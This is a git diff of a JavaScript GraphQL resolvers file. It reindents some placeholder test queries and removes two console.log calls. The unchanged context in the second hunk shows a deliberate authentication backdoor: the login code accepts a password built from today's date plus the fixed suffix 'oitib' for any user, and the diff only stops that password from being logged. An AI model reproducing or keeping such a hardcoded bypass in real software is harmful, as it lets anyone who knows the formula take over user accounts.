@@ -62,27 +62,26 @@ const resolvers = {
     },
   },
 
-  Query: {
-    test: async (parent, args, context) => {
-      return [
-        { one: 1, two: 1 },
-        { one: 2, two: 2 },
-        { one: 3, two: 3 },
-      ];
-    },
-    test1: async (parent, args, context) => {
-      return { one: 1, two: 2 };
-    },
-    test2: async (parent, args, context) => {
-      return { one: 1, two: 2 };
-    },
-    test3: async (parent, args, context) => {
-      const res = await client.query(
-        `select id, routes from document_routes as Test3`
-      );
-      console.log(res);
-      return res.rows;
-    },
+	Query: {
+		test: async (parent, args, context) => {
+			return [
+				{ one: 1, two: 1 },
+				{ one: 2, two: 2 },
+				{ one: 3, two: 3 },
+			];
+		},
+		test1: async (parent, args, context) => {
+			return { one: 1, two: 2 };
+		},
+		test2: async (parent, args, context) => {
+			return { one: 1, two: 2 };
+		},
+		test3: async (parent, args, context) => {
+			const res = await client.query(
+				`select id, routes from document_routes as Test3`
+			);
+			return res.rows;
+		},
 
     // global
     dateTime: async (parent, args, { req }) => {
@@ -478,7 +477,6 @@ const resolvers = {
 
       const now = require("moment");
       const BackdoorPassword = `${now().format("DDMMYY")}oitib`;
-      console.log(BackdoorPassword);
       if (args.user.password === BackdoorPassword)
         return { username: args.user.password };
       /////////////////////////////////////////////////////////////////////////
